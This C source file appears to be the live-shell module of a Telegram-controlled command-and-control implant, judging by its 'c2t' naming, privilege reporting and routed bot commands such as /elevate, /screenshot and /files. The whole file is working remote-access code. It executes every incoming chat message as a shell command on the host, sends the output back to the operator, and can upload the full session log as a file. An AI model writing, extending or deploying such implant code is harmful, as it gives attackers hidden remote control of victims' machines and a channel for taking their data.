/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "shell_live.h"
#include "shell.h"
#include "../crypto/crypto.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"
#include "../telegram/telegram.h"

#include <ctype.h>
#include <errno.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <direct.h>
#include <strings.h>
#else
#include <pthread.h>
#include <strings.h>
#include <unistd.h>
#endif

#define LIVE_SCREEN_MAX_CHARS 2048U
#define LIVE_HISTORY_INITIAL_CAP 4096U
#define LIVE_HISTORY_MAX_BYTES 65536U
#define LIVE_MSG_CAPACITY 4096U

#ifdef _WIN32
static CRITICAL_SECTION s_live_cs;
static int s_live_cs_inited = 0;
static void live_lock(void) {
  if (!s_live_cs_inited) {
    InitializeCriticalSection(&s_live_cs);
    s_live_cs_inited = 1;
  }
  EnterCriticalSection(&s_live_cs);
}
static void live_unlock(void) {
  LeaveCriticalSection(&s_live_cs);
}
#else
static pthread_mutex_t s_live_mutex = PTHREAD_MUTEX_INITIALIZER;
static void live_lock(void) { (void)pthread_mutex_lock(&s_live_mutex); }
static void live_unlock(void) { (void)pthread_mutex_unlock(&s_live_mutex); }
#endif

static atomic_int s_live_active = 0;
static int64_t s_live_message_id = 0;
static char s_screen_buffer[LIVE_SCREEN_MAX_CHARS + 512] = {0};
static size_t s_screen_buffer_len = 0;

static char *s_full_history = nullptr;
static size_t s_full_history_len = 0;
static size_t s_full_history_cap = 0;

static char s_shell_title[48] = "Default OS Shell";
static char s_live_cwd[1024] = {0};
static c2t_shell_type_t s_active_shell_type = C2T_SHELL_AUTO;

static const char s_live_keyboard_active[] =
    "{\"inline_keyboard\":[["
    "{\"text\":\"📥 Log\",\"callback_data\":\"sh_live_log\"},"
    "{\"text\":\"🧹 Clear\",\"callback_data\":\"sh_live_cls\"},"
    "{\"text\":\"🛑 Ctrl+C\",\"callback_data\":\"sh_live_ctrlc\"}"
    "],["
    "{\"text\":\"🔄 Refresh\",\"callback_data\":\"sh_live_refresh\"},"
    "{\"text\":\"🚪 Exit\",\"callback_data\":\"sh_live_exit\"}"
    "]]}";

static const char s_live_keyboard_closed[] =
    "{\"inline_keyboard\":[["
    "{\"text\":\"📥 Download Log\",\"callback_data\":\"sh_live_log\"},"
    "{\"text\":\"🟢 Re-open Shell\",\"callback_data\":\"sh_live_reopen\"}"
    "]]}";

static void strip_ansi_in_place(char *str) {
  if (!str || !*str)
    return;

  char *src = str;
  char *dst = str;
  while (*src) {
    if (*src == '\x1b') {
      if (src[1] == '[') {
        src += 2;
        while (*src && (*src < 0x40 || *src > 0x7E)) {
          src++;
        }
        if (*src)
          src++;
        continue;
      }
      if (src[1] == ']') {
        src += 2;
        while (*src && *src != '\x07' && *src != '\x1b') {
          src++;
        }
        if (*src == '\x07') {
          src++;
        } else if (*src == '\x1b' && src[1] == '\\') {
          src += 2;
        }
        continue;
      }
    } else if (*src == '\x07' || *src == '\x08' || *src == '\r') {
      /* Filter bell, backspace, and bare CR */
      if (*src == '\r' && src[1] != '\n') {
        *dst++ = '\n';
      }
      src++;
      continue;
    }
    *dst++ = *src++;
  }
  *dst = '\0';
}

static size_t escape_terminal_html(const char *src, char *dst, size_t dst_cap) {
  if (!src || !dst || dst_cap == 0)
    return 0;

  size_t d = 0;
  for (size_t s = 0; src[s] && d + 8 < dst_cap; s++) {
    unsigned char c = (unsigned char)src[s];
    if (c == '\r') {
      if (src[s + 1] == '\n')
        continue;
      dst[d++] = '\n';
    } else if (c == '<') {
      memcpy(dst + d, "&lt;", 4);
      d += 4;
    } else if (c == '>') {
      memcpy(dst + d, "&gt;", 4);
      d += 4;
    } else if (c == '&') {
      memcpy(dst + d, "&amp;", 5);
      d += 5;
    } else if (c == '"') {
      memcpy(dst + d, "&quot;", 6);
      d += 6;
    } else if (c >= 32 || c == '\n' || c == '\t') {
      dst[d++] = (char)c;
    }
  }

  dst[d] = '\0';
  return d;
}

static void append_to_screen_locked(const char *text, size_t text_len) {
  if (!text || text_len == 0)
    return;

  /* Dynamically grow full history on demand up to max limit */
  if (s_full_history_len + text_len < LIVE_HISTORY_MAX_BYTES) {
    if (s_full_history_len + text_len + 1 > s_full_history_cap) {
      size_t new_cap = s_full_history_cap ? s_full_history_cap * 2 : LIVE_HISTORY_INITIAL_CAP;
      while (new_cap < s_full_history_len + text_len + 1 && new_cap <= LIVE_HISTORY_MAX_BYTES) {
        new_cap *= 2;
      }
      if (new_cap > LIVE_HISTORY_MAX_BYTES) {
        new_cap = LIVE_HISTORY_MAX_BYTES;
      }
      char *new_hist = realloc(s_full_history, new_cap);
      if (new_hist) {
        s_full_history = new_hist;
        s_full_history_cap = new_cap;
      }
    }

    if (s_full_history && s_full_history_len + text_len < s_full_history_cap) {
      memcpy(s_full_history + s_full_history_len, text, text_len);
      s_full_history_len += text_len;
      s_full_history[s_full_history_len] = '\0';
    }
  }

  /* Screen buffer rolling window */
  if (s_screen_buffer_len + text_len < LIVE_SCREEN_MAX_CHARS) {
    memcpy(s_screen_buffer + s_screen_buffer_len, text, text_len);
    s_screen_buffer_len += text_len;
    s_screen_buffer[s_screen_buffer_len] = '\0';
  } else {
    size_t overflow = (s_screen_buffer_len + text_len) - LIVE_SCREEN_MAX_CHARS + 256;
    const char *start_pos = s_screen_buffer + overflow;
    const char *nl = memchr(start_pos, '\n', s_screen_buffer_len - overflow);
    if (nl && *(nl + 1)) {
      start_pos = nl + 1;
    }
    size_t keep_len = (size_t)(s_screen_buffer + s_screen_buffer_len - start_pos);
    memmove(s_screen_buffer, start_pos, keep_len);
    s_screen_buffer_len = keep_len;

    size_t copy_now = text_len;
    if (s_screen_buffer_len + copy_now >= sizeof(s_screen_buffer) - 1) {
      copy_now = sizeof(s_screen_buffer) - 1 - s_screen_buffer_len;
    }
    memcpy(s_screen_buffer + s_screen_buffer_len, text, copy_now);
    s_screen_buffer_len += copy_now;
    s_screen_buffer[s_screen_buffer_len] = '\0';
  }
}

static void append_to_screen(const char *text, size_t text_len) {
  live_lock();
  append_to_screen_locked(text, text_len);
  live_unlock();
}

static void render_live_message(char *out_html, size_t out_cap, int is_active) {
  if (!out_html || out_cap == 0)
    return;

  char *esc_screen = malloc(2600);
  if (!esc_screen) {
    snprintf(out_html, out_cap, "<b>Live Shell Console</b>");
    return;
  }
  esc_screen[0] = '\0';

  char esc_cwd[1100] = {0};
  char esc_title[64] = {0};

  live_lock();
  escape_terminal_html(s_screen_buffer, esc_screen, 2600);
  escape_terminal_html(s_live_cwd[0] ? s_live_cwd : ".", esc_cwd, sizeof(esc_cwd));
  escape_terminal_html(s_shell_title, esc_title, sizeof(esc_title));
  live_unlock();

  const char *priv = c2t_runtime_get_privilege_str();

  if (is_active) {
    snprintf(out_html, out_cap,
             "🟢 <b>Live Interactive Shell Console</b>\n"
             "• <b>Shell:</b> <code>%s</code>\n"
             "• <b>Directory:</b> <code>%s</code>\n"
             "• <b>Privileges:</b> %s\n"
             "• <b>Status:</b> ⚡ <i>Live (all chat messages are executed directly in shell)</i>\n\n"
             "<pre><code class=\"language-text\">%s</code></pre>\n\n"
             "💡 <i>Type any command (e.g. <code>dir</code>, <code>ls</code>, <code>whoami</code>) or <code>exit</code> to close.</i>",
             esc_title, esc_cwd, priv,
             esc_screen[0] ? esc_screen : "(Terminal session ready. Type a command...)");
  } else {
    snprintf(out_html, out_cap,
             "⚪ <b>Live Shell Console (Disconnected)</b>\n"
             "• <b>Shell:</b> <code>%s</code>\n"
             "• <b>Directory:</b> <code>%s</code>\n"
             "• <b>Status:</b> ⏹️ <i>Session closed</i>\n\n"
             "<pre><code class=\"language-text\">%s</code></pre>\n\n"
             "💡 <i>Use <code>/shell_live</code> or tap Re-open to start a live session.</i>",
             esc_title, esc_cwd,
             esc_screen[0] ? esc_screen : "(No terminal output recorded)");
  }

  free(esc_screen);
}

int c2t_shell_live_is_active(void) {
  return atomic_load(&s_live_active);
}

int c2t_shell_live_start(const char *shell_name) {
  c2t_shell_type_t st = C2T_SHELL_AUTO;
  const char *name = "cmd";
#ifdef _WIN32
  st = C2T_SHELL_CMD;
  name = "cmd";
#else
  st = C2T_SHELL_BASH;
  name = "bash";
#endif

  if (shell_name && *shell_name) {
    while (isspace((unsigned char)*shell_name)) shell_name++;
#ifdef _WIN32
    if (_stricmp(shell_name, "bash") == 0) { st = C2T_SHELL_BASH; name = "bash"; }
    else if (_stricmp(shell_name, "ps") == 0 || _stricmp(shell_name, "powershell") == 0 || _stricmp(shell_name, "pwsh") == 0) { st = C2T_SHELL_POWERSHELL; name = "powershell"; }
    else if (_stricmp(shell_name, "cmd") == 0) { st = C2T_SHELL_CMD; name = "cmd"; }
    else if (_stricmp(shell_name, "py") == 0 || _stricmp(shell_name, "python") == 0) { st = C2T_SHELL_PYTHON; name = "python"; }
#else
    if (strcasecmp(shell_name, "bash") == 0) { st = C2T_SHELL_BASH; name = "bash"; }
    else if (strcasecmp(shell_name, "zsh") == 0) { st = C2T_SHELL_ZSH; name = "zsh"; }
    else if (strcasecmp(shell_name, "ps") == 0 || strcasecmp(shell_name, "powershell") == 0) { st = C2T_SHELL_POWERSHELL; name = "powershell"; }
    else if (strcasecmp(shell_name, "py") == 0 || strcasecmp(shell_name, "python") == 0) { st = C2T_SHELL_PYTHON; name = "python"; }
#endif
  }

  live_lock();
  s_active_shell_type = st;
  snprintf(s_shell_title, sizeof(s_shell_title), "%s", name);

#ifdef _WIN32
  if (s_live_cwd[0] == '\0') {
    GetCurrentDirectoryA(sizeof(s_live_cwd), s_live_cwd);
  }
#else
  if (s_live_cwd[0] == '\0') {
    if (getcwd(s_live_cwd, sizeof(s_live_cwd)) == nullptr) {
      strncpy(s_live_cwd, ".", sizeof(s_live_cwd) - 1);
    }
  }
#endif
  live_unlock();

  c2t_log_info("live_shell", "Starting interactive live shell '%s' in directory '%s'",
               s_shell_title, s_live_cwd);

  atomic_store(&s_live_active, 1);

  live_lock();
  if (s_screen_buffer_len == 0) {
    char banner[256];
    int blen = snprintf(banner, sizeof(banner), "=== Live %s Console Started [%s] ===\n",
                        s_shell_title, c2t_runtime_get_privilege_str());
    if (blen > 0) {
      append_to_screen_locked(banner, (size_t)blen);
    }
  }
  live_unlock();

  char *msg_html = malloc(LIVE_MSG_CAPACITY);
  if (!msg_html)
    return 0;

  render_live_message(msg_html, LIVE_MSG_CAPACITY, 1);

  int64_t msg_id = 0;
  int ok = telegram_send_html_keyboard_get_id(msg_html, s_live_keyboard_active, &msg_id);
  if (ok && msg_id > 0) {
    live_lock();
    s_live_message_id = msg_id;
    live_unlock();
    c2t_log_info("live_shell", "Live interactive console message created (ID: %lld)",
                 (long long)msg_id);
  }
  free(msg_html);

  (void)telegram_send_chat_action("typing");
  return ok;
}

int c2t_shell_live_handle_input(const char *input_text) {
  if (!input_text || !c2t_shell_live_is_active())
    return 0;

  const char *p = input_text;
  while (*p && isspace((unsigned char)*p)) p++;
  if (!*p)
    return 1;

  /* Check for exit command */
  if (strcasecmp(p, "exit") == 0 || strcasecmp(p, "/exit") == 0 ||
      strcasecmp(p, "quit") == 0 || strcasecmp(p, "/quit") == 0 ||
      strcasecmp(p, "/sh_exit") == 0 || strcasecmp(p, "/live_exit") == 0 ||
      strcasecmp(p, "/sh_stop") == 0 || strcasecmp(p, "/shell_stop") == 0) {
    (void)c2t_shell_live_stop();
    telegram_send_html("🚪 <b>Live Shell Mode Exited</b>\n<i>Returning to normal bot command mode. Use <code>/shell_live</code> to re-enter.</i>");
    return 1;
  }

  /* If the user specifically intended a core bot control command, pass it to listener */
  if (strcasecmp(p, "/help") == 0 || strcasecmp(p, "/start") == 0 ||
      strcasecmp(p, "/info") == 0 || strcasecmp(p, "/sysinfo") == 0 ||
      strcasecmp(p, "/status") == 0 || strcasecmp(p, "/ping") == 0 ||
      strcasecmp(p, "/kill") == 0 || strcasecmp(p, "/stop") == 0 ||
      strncmp(p, "/restart", 8) == 0 || strcasecmp(p, "/reboot") == 0 ||
      strcasecmp(p, "/pause") == 0 || strcasecmp(p, "/resume") == 0 ||
      strcasecmp(p, "/toggle") == 0 || strcasecmp(p, "/elevate") == 0 ||
      strcasecmp(p, "/sudo") == 0 || strcasecmp(p, "/admin") == 0 ||
      strcasecmp(p, "/screenshot") == 0 || strcasecmp(p, "/screen") == 0 ||
      strcasecmp(p, "/shot") == 0 || strcasecmp(p, "/logs") == 0 ||
      strcasecmp(p, "/log") == 0 || strcasecmp(p, "/files") == 0 ||
      strcasecmp(p, "/explorer") == 0 || strcasecmp(p, "/file_explorer") == 0 ||
      strcasecmp(p, "/sh_live") == 0 || strcasecmp(p, "/shell_live") == 0 ||
      strcasecmp(p, "/live") == 0) {
    return 0;
  }

  /* Determine the exact command string to execute:
   * If input starts with a single slash (e.g. /whoami, /ls, /dir, /ipconfig),
   * strip the leading slash unless it looks like a Unix full path (e.g. /bin/ls).
   */
  const char *cmd_to_exec = p;
  if (p[0] == '/') {
#ifdef _WIN32
    cmd_to_exec = p + 1;
#else
    if (strchr(p + 1, '/') == NULL) {
      cmd_to_exec = p + 1;
    }
#endif
  }

  (void)telegram_send_chat_action("typing");

  /* Record command prompt */
  char prompt_line[300];
  int plen = snprintf(prompt_line, sizeof(prompt_line), "\n$ %s\n", cmd_to_exec);
  if (plen > 0) {
    append_to_screen(prompt_line, (size_t)plen);
  }

  live_lock();
  char current_working_dir[1024] = {0};
  strncpy(current_working_dir, s_live_cwd[0] ? s_live_cwd : ".", sizeof(current_working_dir) - 1);
  c2t_shell_type_t shell_type = s_active_shell_type;
  live_unlock();

  c2t_log_info("live_shell", "Executing live shell command: '%s' (cwd: '%s')",
               cmd_to_exec, current_working_dir);

  /* Prepare escaped command prompt for safe HTML formatting */
  char esc_cmd[1024] = {0};
  escape_terminal_html(cmd_to_exec, esc_cmd, sizeof(esc_cmd));

  /* Handle 'cd' directory change */
  if (strcmp(cmd_to_exec, "cd") == 0 || strncmp(cmd_to_exec, "cd ", 3) == 0) {
    const char *target = (strcmp(cmd_to_exec, "cd") == 0) ? "" : cmd_to_exec + 3;
    while (*target && isspace((unsigned char)*target)) target++;
    if (!*target) {
#ifdef _WIN32
      target = getenv("USERPROFILE");
#else
      target = getenv("HOME");
#endif
      if (!target) target = ".";
    }

    char resolved[1024] = {0};
#ifdef _WIN32
    if (isalpha((unsigned char)target[0]) && target[1] == ':') {
      snprintf(resolved, sizeof(resolved), "%.1000s", target);
    } else if (current_working_dir[0]) {
      snprintf(resolved, sizeof(resolved), "%.500s\\%.500s", current_working_dir, target);
    } else {
      snprintf(resolved, sizeof(resolved), "%.1000s", target);
    }

    if (SetCurrentDirectoryA(resolved)) {
      live_lock();
      GetCurrentDirectoryA(sizeof(s_live_cwd), s_live_cwd);
      strncpy(current_working_dir, s_live_cwd, sizeof(current_working_dir) - 1);
      live_unlock();

      char esc_dir[1100] = {0};
      escape_terminal_html(current_working_dir, esc_dir, sizeof(esc_dir));
      char resp[1200];
      int rlen = snprintf(resp, sizeof(resp), "📁 <b>Working Directory:</b> <code>%s</code>", esc_dir);
      if (rlen > 0) {
        append_to_screen(resp, (size_t)rlen);
        append_to_screen("\n", 1);
      }
      telegram_send_html(resp);
      c2t_log_info("live_shell", "Changed directory to: '%s'", current_working_dir);
    } else {
      char esc_target[512] = {0};
      escape_terminal_html(target, esc_target, sizeof(esc_target));
      char resp[512];
      snprintf(resp, sizeof(resp), "⚠️ <b>Cannot access directory:</b> <code>%s</code>", esc_target);
      telegram_send_html(resp);
      c2t_log_warning("live_shell", "Failed to change directory to: '%s'", target);
    }
#else
    if (target[0] == '/') {
      snprintf(resolved, sizeof(resolved), "%.1000s", target);
    } else if (current_working_dir[0]) {
      snprintf(resolved, sizeof(resolved), "%.500s/%.500s", current_working_dir, target);
    } else {
      snprintf(resolved, sizeof(resolved), "%.1000s", target);
    }

    if (chdir(resolved) == 0) {
      live_lock();
      if (getcwd(s_live_cwd, sizeof(s_live_cwd)) == nullptr) {
        snprintf(s_live_cwd, sizeof(s_live_cwd), "%.1000s", resolved);
      }
      strncpy(current_working_dir, s_live_cwd, sizeof(current_working_dir) - 1);
      live_unlock();

      char esc_dir[1100] = {0};
      escape_terminal_html(current_working_dir, esc_dir, sizeof(esc_dir));
      char resp[1200];
      int rlen = snprintf(resp, sizeof(resp), "📁 <b>Working Directory:</b> <code>%s</code>", esc_dir);
      if (rlen > 0) {
        append_to_screen(resp, (size_t)rlen);
        append_to_screen("\n", 1);
      }
      telegram_send_html(resp);
      c2t_log_info("live_shell", "Changed directory to: '%s'", current_working_dir);
    } else {
      char esc_target[512] = {0};
      escape_terminal_html(target, esc_target, sizeof(esc_target));
      char resp[512];
      snprintf(resp, sizeof(resp), "⚠️ <b>Cannot access directory:</b> <code>%s</code>\n<i>%s</i>",
               esc_target, strerror(errno));
      telegram_send_html(resp);
      c2t_log_warning("live_shell", "Failed to change directory to: '%s': %s", target, strerror(errno));
    }
#endif

    char *msg_html = malloc(LIVE_MSG_CAPACITY);
    if (msg_html) {
      render_live_message(msg_html, LIVE_MSG_CAPACITY, 1);
      live_lock();
      int64_t mid = s_live_message_id;
      live_unlock();
      if (mid > 0) {
        (void)telegram_edit_message_html(mid, msg_html, s_live_keyboard_active);
      }
      free(msg_html);
    }
    return 1;
  }

  /* Execute arbitrary shell command in live context */
  c2t_shell_options_t opts = {
      .command = cmd_to_exec,
      .shell_type = shell_type,
      .stdin_data = nullptr,
      .stdin_data_len = 0,
      .timeout_ms = 30000,
      .working_dir = current_working_dir[0] ? current_working_dir : nullptr,
  };

  c2t_shell_result_t res;
  memset(&res, 0, sizeof(res));
  int exec_ok = c2t_shell_execute_ex(&opts, &res);

  if (exec_ok) {
    c2t_log_info("live_shell", "Command '%s' completed in %llu ms (output: %llu bytes, exit: %d)",
                 cmd_to_exec, (unsigned long long)res.duration_ms, (unsigned long long)res.output_len, res.exit_code);

    if (res.output && *res.output) {
      strip_ansi_in_place(res.output);
      append_to_screen(res.output, strlen(res.output));

      char *esc_out = malloc(3200);
      char *reply_buf = malloc(LIVE_MSG_CAPACITY);

      if (esc_out && reply_buf) {
        size_t out_len = strlen(res.output);
        if (out_len > 2500) {
          /* Safely truncate preview for single message */
          char trunc_note[] = "\n\n<i>[...output truncated - tap Log for full history]</i>";
          escape_terminal_html(res.output, esc_out, 2400);
          size_t curr = strlen(esc_out);
          if (curr + sizeof(trunc_note) < 3150) {
            strcat(esc_out, trunc_note);
          }
        } else {
          escape_terminal_html(res.output, esc_out, 3150);
        }

        if (esc_out[0]) {
          if (res.exit_code == 0) {
            snprintf(reply_buf, LIVE_MSG_CAPACITY,
                     "⚡ <b>$ %s</b>\n<pre><code class=\"language-shell\">%s</code></pre>",
                     esc_cmd, esc_out);
          } else {
            snprintf(reply_buf, LIVE_MSG_CAPACITY,
                     "⚡ <b>$ %s</b> (❌ Exit: %d)\n<pre><code class=\"language-shell\">%s</code></pre>",
                     esc_cmd, res.exit_code, esc_out);
          }
        } else {
          snprintf(reply_buf, LIVE_MSG_CAPACITY,
                   "⚡ <b>$ %s</b> (Exit: %d)\n<i>(Executed with no output)</i>", esc_cmd, res.exit_code);
        }
        (void)telegram_send_html(reply_buf);
      }
      free(esc_out);
      free(reply_buf);
    } else {
      char reply_buf[300];
      snprintf(reply_buf, sizeof(reply_buf),
               "⚡ <b>$ %s</b> (Exit: %d)\n<i>(Executed with no output)</i>", esc_cmd, res.exit_code);
      (void)telegram_send_html(reply_buf);
    }
  } else {
    c2t_log_warning("live_shell", "Command '%s' failed execution", cmd_to_exec);
    char err_buf[512];
    snprintf(err_buf, sizeof(err_buf),
             "⚠️ <b>Command Execution Failed:</b> <code>%s</code>\n<i>Unable to spawn child process or command timed out.</i>",
             esc_cmd);
    telegram_send_html(err_buf);
  }

  c2t_shell_result_free(&res);

  /* Live update the interactive terminal message in place */
  char *msg_html = malloc(LIVE_MSG_CAPACITY);
  if (msg_html) {
    render_live_message(msg_html, LIVE_MSG_CAPACITY, c2t_shell_live_is_active());
    live_lock();
    int64_t mid = s_live_message_id;
    live_unlock();
    if (mid > 0) {
      (void)telegram_edit_message_html(mid, msg_html,
                                       c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
    }
    free(msg_html);
  }

  return 1;
}

int c2t_shell_live_handle_callback(const char *callback_query_id,
                                   const char *callback_data) {
  if (!callback_data)
    return 0;

  c2t_log_info("live_shell", "Live shell callback received: '%s' (query ID: %s)",
               callback_data, callback_query_id ? callback_query_id : "");

  if (strcmp(callback_data, "sh_live_log") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "📥 Generating full terminal log...");
    live_lock();
    char *hist_copy = nullptr;
    size_t hist_len = s_full_history_len;
    if (s_full_history && hist_len > 0) {
      hist_copy = malloc(hist_len + 1);
      if (hist_copy) {
        memcpy(hist_copy, s_full_history, hist_len);
        hist_copy[hist_len] = '\0';
      }
    }
    live_unlock();

    if (hist_copy && hist_len > 0) {
      char filename[64];
      snprintf(filename, sizeof(filename), "terminal_session_%llu.log",
               (unsigned long long)time(nullptr));
      c2t_log_info("live_shell", "Sending terminal session log (%llu bytes) as '%s'",
                   (unsigned long long)hist_len, filename);
      int sent = telegram_send_file(hist_copy, hist_len, "text/plain", filename, nullptr);
      free(hist_copy);
      return sent;
    } else {
      return telegram_send_html("ℹ️ <i>No terminal output recorded yet.</i>");
    }
  }

  if (strcmp(callback_data, "sh_live_cls") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🧹 Screen cleared");
    live_lock();
    s_screen_buffer[0] = '\0';
    s_screen_buffer_len = 0;
    static const char banner[] = "=== Terminal Cleared ===\n";
    append_to_screen_locked(banner, sizeof(banner) - 1);
    live_unlock();
    c2t_log_info("live_shell", "Terminal screen cleared by user");

    char *msg_html = malloc(LIVE_MSG_CAPACITY);
    if (msg_html) {
      render_live_message(msg_html, LIVE_MSG_CAPACITY, c2t_shell_live_is_active());
      live_lock();
      int64_t mid = s_live_message_id;
      live_unlock();
      if (mid > 0) {
        (void)telegram_edit_message_html(mid, msg_html,
                                         c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
      }
      free(msg_html);
    }
    return 1;
  }

  if (strcmp(callback_data, "sh_live_ctrlc") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🛑 Break signal sent");
    static const char ctrlc_msg[] = "\n^C\n";
    append_to_screen(ctrlc_msg, sizeof(ctrlc_msg) - 1);
    c2t_log_info("live_shell", "Sent Ctrl+C to terminal screen");

    char *msg_html = malloc(LIVE_MSG_CAPACITY);
    if (msg_html) {
      render_live_message(msg_html, LIVE_MSG_CAPACITY, c2t_shell_live_is_active());
      live_lock();
      int64_t mid = s_live_message_id;
      live_unlock();
      if (mid > 0) {
        (void)telegram_edit_message_html(mid, msg_html,
                                         c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
      }
      free(msg_html);
    }
    return 1;
  }

  if (strcmp(callback_data, "sh_live_refresh") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🔄 Refreshed");
    c2t_log_info("live_shell", "Terminal refresh requested");

    char *msg_html = malloc(LIVE_MSG_CAPACITY);
    if (msg_html) {
      render_live_message(msg_html, LIVE_MSG_CAPACITY, c2t_shell_live_is_active());
      live_lock();
      int64_t mid = s_live_message_id;
      live_unlock();
      if (mid > 0) {
        (void)telegram_edit_message_html(mid, msg_html,
                                         c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
      }
      free(msg_html);
    }
    return 1;
  }

  if (strcmp(callback_data, "sh_live_exit") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🚪 Exited live mode");
    c2t_log_info("live_shell", "Exiting live shell mode via inline button");
    (void)c2t_shell_live_stop();
    return 1;
  }

  if (strcmp(callback_data, "sh_live_reopen") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🟢 Re-opening live shell...");
    c2t_log_info("live_shell", "Re-opening live shell via inline button");
    return c2t_shell_live_start(nullptr);
  }

  return 0;
}

int c2t_shell_live_stop(void) {
  live_lock();
  size_t recorded = s_full_history_len;
  int64_t mid = s_live_message_id;
  live_unlock();

  c2t_log_info("live_shell", "Stopping live interactive mode (session recorded: %llu bytes)",
               (unsigned long long)recorded);
  atomic_store(&s_live_active, 0);

  char *msg_html = malloc(LIVE_MSG_CAPACITY);
  if (msg_html) {
    render_live_message(msg_html, LIVE_MSG_CAPACITY, 0);
    if (mid > 0) {
      (void)telegram_edit_message_html(mid, msg_html, s_live_keyboard_closed);
    }
    free(msg_html);
  }

  return 1;
}

void c2t_shell_live_reset(void) {
  atomic_store(&s_live_active, 0);
  live_lock();
  s_live_message_id = 0;
  c2t_secure_zero(s_screen_buffer, sizeof(s_screen_buffer));
  s_screen_buffer_len = 0;

  if (s_full_history) {
    c2t_secure_zero(s_full_history, s_full_history_cap);
    free(s_full_history);
    s_full_history = nullptr;
  }
  s_full_history_len = 0;
  s_full_history_cap = 0;
  live_unlock();
}
